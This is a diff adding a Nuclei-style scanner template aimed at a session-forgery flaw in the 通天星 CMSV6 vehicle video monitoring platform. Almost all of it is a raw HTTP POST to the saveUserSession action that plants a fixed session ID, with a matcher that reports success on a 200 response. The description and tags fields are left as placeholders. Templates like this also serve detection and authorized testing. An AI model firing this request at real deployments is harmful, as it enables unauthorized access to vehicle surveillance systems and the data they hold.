@@ -1,0 +1,25 @@
+id: 808gps-saveUserSession-Session
+info:
+  name: 通天星CMSV6车载视频监控平台SESSION伪造漏洞
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://github.com/wy876/POC/blob/31a1d029b89778347a04f3e5c3d2f400259cc10d/%E9%80%9A%E5%A4%A9%E6%98%9F/%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0SESSION%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E.md?plain=1#L14
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /808gps/LocationManagement/UserSessionAction_saveUserSession.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:103.0)Gecko/20100101Firefox/103.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 57
+
+        userSession=42AA7A2BE767123A42E1530ACC920781&amp;amp;id=4
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
